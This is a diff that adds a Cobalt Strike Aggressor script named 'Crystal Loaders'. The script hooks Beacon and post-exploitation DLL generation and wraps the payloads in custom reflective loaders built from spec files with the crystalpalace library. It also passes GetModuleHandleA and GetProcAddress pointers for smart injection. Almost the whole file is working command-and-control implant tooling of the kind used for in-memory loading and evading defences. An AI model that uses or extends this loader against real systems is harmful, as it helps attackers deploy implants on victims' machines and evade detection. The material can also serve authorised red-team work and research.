@@ -1,0 +1,107 @@
+debug ( 7 );
+
+import crystalpalace.spec.* from: crystalpalace.jar;
+import java.util.HashMap;
+
+sub print_info {
+   println ( formatDate ( "[HH:mm:ss] " ) . "\cE[Crystal Loaders]\o " . $1 );
+}
+
+sub print_error {
+   println ( formatDate ( "[HH:mm:ss] " ) . "\c4[Crystal Loaders]\o " . $1 );
+}
+
+# ----------------------------------
+# $1 - Beacon payload file name
+# $2 - Beacon payload (dll binary)
+# $3 - Beacon architecture (x86/x64)
+# ----------------------------------
+set BEACON_RDLL_GENERATE
+{
+    local ( '$path $spec $cap $final' );
+
+    $path  = getFileProper ( script_resource ( "loader" ), "loader.spec" );
+    $spec  = [ LinkSpec Parse: $path ];
+    $cap   = [ Capability Parse: $2 ];
+    $final = [ $spec run: $cap, [ new HashMap ] ];
+
+    if ( strlen ( $final ) == 0 )
+    {
+        print_error ( "Failed to build custom loader." );
+        return $null;
+    }
+
+    print_info ( "Built custom loader." );
+    return $final;
+}
+
+# ----------------------------------
+# $1 - Beacon payload file name
+# $2 - Beacon payload (dll binary)
+# $3 - Beacon architecture (x86/x64)
+# $4 - Parent beacon ID
+# $5 - GetModuleHandleA pointer
+# $6 - GetProcAddress pointer
+# ----------------------------------
+set BEACON_RDLL_GENERATE_LOCAL
+{
+    local ( '$path $spec $cap $vars $final' );
+
+    $path = getFileProper ( script_resource ( "loader" ), "smart-loader.spec" );
+    $spec = [ LinkSpec Parse: $path ];
+    $cap  = [ Capability Parse: $2 ];
+    
+    $vars = [ new HashMap ];
+    [ $vars put: "\$GMH", cast ( $5, 'b' ) ];
+    [ $vars put: "\$GPA", cast ( $6, 'b' ) ];
+
+    $final = [ $spec run: $2, $vars ];
+
+    if ( strlen ( $final ) == 0 )
+    {
+        print_error ( "Failed to build custom loader." );
+        return $null;
+    }
+
+    print_info ( "Built custom loader." );
+    return $final;
+}
+
+# ------------------------------------
+# $1 – Post-ex payload file name
+# $2 – Post-ex payload (dll binary)
+# $3 – Post-ex architecture (x86/x64)
+# $4 – parent Beacon ID
+# $5 – GetModuleHandle pointer
+# $6 – GetProcAddress pointer
+# ------------------------------------
+set POSTEX_RDLL_GENERATE
+{
+    local ( '$path $spec $cap $vars $final' );
+
+    # not sure how smart inject works for cross-arch
+    # injection because pointers are different sizes
+    if ( barch ( $4 ) ne $3 ) {
+        print_error ( "Cannot use smart inject for cross-arch injection. Falling back to default loader." );
+        return $null;
+    }
+
+    $path = getFileProper ( script_resource ( "postex" ), "loader.spec" );
+    $spec = [ LinkSpec Parse: $path ];
+    $cap  = [ Capability Parse: $2 ];
+    
+    $vars = [ new HashMap ];
+    [ $vars put: "\$GMH", cast ( $5, 'b' ) ];
+    [ $vars put: "\$GPA", cast ( $6, 'b' ) ];
+
+    $final = [ $spec run: $2, $vars ];
+
+    if ( strlen ( $final ) == 0 )
+    {
+        print_error ( "Failed to build custom postex loader." );
+        return $null;
+    }
+
+    print_info ( "Built custom postex loader." );
+    return $final;
+}
